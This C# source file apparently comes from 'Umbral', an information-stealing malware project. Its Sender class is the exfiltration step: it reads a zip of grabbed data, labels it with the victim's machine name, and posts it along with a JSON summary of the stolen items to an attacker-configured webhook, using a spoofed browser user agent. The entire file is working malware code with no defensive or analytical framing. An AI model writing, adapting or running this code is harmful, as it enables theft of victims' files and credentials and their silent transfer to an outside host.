using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;
using Umbral.payload.Config;

namespace Umbral.payload.Postman
{
    internal static class Sender
    {
        internal static async Task Post(string zipPath, Dictionary<string, int> grabbedInfoDictionary)
        {
            var payloadGen = new PayloadGen(grabbedInfoDictionary);
            var payload = await payloadGen.GetPayload();

            try
            {
                using (var client = new HttpClient())
                {
                    client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
                    client.DefaultRequestHeaders.UserAgent.ParseAdd(
                        "Opera/9.80 (Windows NT 6.1; YB/4.0.0) Presto/2.12.388 Version/12.17");

                    using (var form = new MultipartFormDataContent())
                    {
                        var fileBytes = File.ReadAllBytes(zipPath);
                        var fileContent = new ByteArrayContent(fileBytes);
                        fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/zip");
                        form.Add(fileContent, "file", $"Umbral-{Environment.MachineName}.zip");

                        var jsonContent = new StringContent(payload, Encoding.UTF8, "application/json");
                        await client.PostAsync(Settings.WebhookUrl, jsonContent);

                        await client.PostAsync(Settings.WebhookUrl, form);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}